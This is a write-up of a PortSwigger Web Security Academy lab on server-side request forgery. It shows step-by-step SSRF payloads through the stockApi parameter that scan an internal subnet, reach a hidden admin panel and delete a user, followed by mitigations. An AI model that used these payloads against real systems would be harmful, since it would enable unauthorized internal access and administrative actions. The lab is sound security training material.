# Lab: Basic SSRF Against Another Back-end System

## Overview

This lab demonstrates a **Server-Side Request Forgery (SSRF)** vulnerability where the application retrieves stock information from a user-controlled URL. The internal administrative interface is hosted on another back-end system within the private network.

The objective is to identify the internal IP address hosting the admin panel, access it through SSRF, and delete the user **carlos**.

---

## Objective

Exploit the SSRF vulnerability to:

- Discover the internal back-end server.
- Access the hidden admin interface.
- Delete the user **carlos**.
- Solve the lab.

---

## Tools Used

- Burp Suite Community Edition
- Burp Intruder
- Firefox
- PortSwigger Web Security Academy

---

## Vulnerability Explanation

The application uses the `stockApi` parameter to fetch stock information from a URL supplied in the request.

Original request:

```http
POST /product/stock HTTP/2

stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1
```

Because the application does not validate the destination, an attacker can make the server issue requests to internal IP addresses that are inaccessible from the Internet.

The administrator interface is hosted somewhere within the subnet:

```text
192.168.0.0/24
```

By enumerating the subnet, the correct host can be identified and accessed.

---

## Steps to Reproduce

### Step 1: Capture the Stock Check Request

1. Open any product.
2. Click **Check stock**.
3. Intercept the request in Burp Suite.

Locate the following parameter:

```text
stockApi=http://stock.weliketoshop.net:8080/...
```

---

### Step 2: Enumerate the Internal Network

Send the request to **Burp Intruder**.

Replace the IP address with a payload position:

```text
http://192.168.0.§1§:8080/admin
```

Configure the payload:

- Payload Type: Numbers
- From: 1
- To: 255
- Step: 1

Start the attack.

Look for the response that differs from the others.

The valid host responds with the admin page.

Example:

```text
http://192.168.0.62:8080/admin
```

---

### Step 3: Access the Admin Panel

Modify the original request to use the discovered IP:

```text
stockApi=http://192.168.0.62:8080/admin
```

Forward the request.

The response contains the internal administration interface and the available delete endpoints.

Example:

```text
/admin/delete?username=carlos
```

---

### Step 4: Delete the User

Modify the request once more:

```text
stockApi=http://192.168.0.62:8080/admin/delete?username=carlos
```

Forward the request.

The server performs the request internally and deletes the user.

---

### Step 5: Verify the Solution

Return to the lab page.

The lab is solved after the user **carlos** has been deleted.

---

## Payloads Used

Enumerate internal hosts:

```text
http://192.168.0.X:8080/admin
```

Access admin panel:

```text
http://192.168.0.62:8080/admin
```

Delete Carlos:

```text
http://192.168.0.62:8080/admin/delete?username=carlos
```

---

## Proof of Concept

1. Intercepted the stock check request.
2. Used Burp Intruder to enumerate the `192.168.0.0/24` subnet.
3. Identified the internal host running the admin interface.
4. Accessed the admin panel using SSRF.
5. Retrieved the delete endpoint for the user `carlos`.
6. Sent a second SSRF request to the delete endpoint.
7. Successfully deleted the user and solved the lab.

---

## Impact

Successful exploitation may allow an attacker to:

- Discover internal network infrastructure.
- Perform internal network reconnaissance.
- Access services that are not publicly exposed.
- Bypass firewall restrictions.
- Execute unauthorized administrative actions.
- Reach sensitive internal systems.

---

## Mitigation

- Restrict outbound requests to an allowlist of trusted hosts.
- Block requests to private and loopback IP ranges.
- Validate all user-supplied URLs before making server-side requests.
- Disable unnecessary URL schemes.
- Restrict outbound network connectivity using firewall rules.
- Separate internal administrative services from user-controlled functionality.
- Monitor and log unexpected outbound requests.

---

## Key Learnings

- Learned how SSRF can be used to access internal back-end systems.
- Practiced internal network enumeration using Burp Intruder.
- Understood how attackers discover hidden administrative interfaces.
- Learned how SSRF enables interaction with services inside private networks.
- Demonstrated how SSRF can lead to unauthorized administrative actions.
- Gained hands-on experience exploiting SSRF vulnerabilities in a controlled environment.
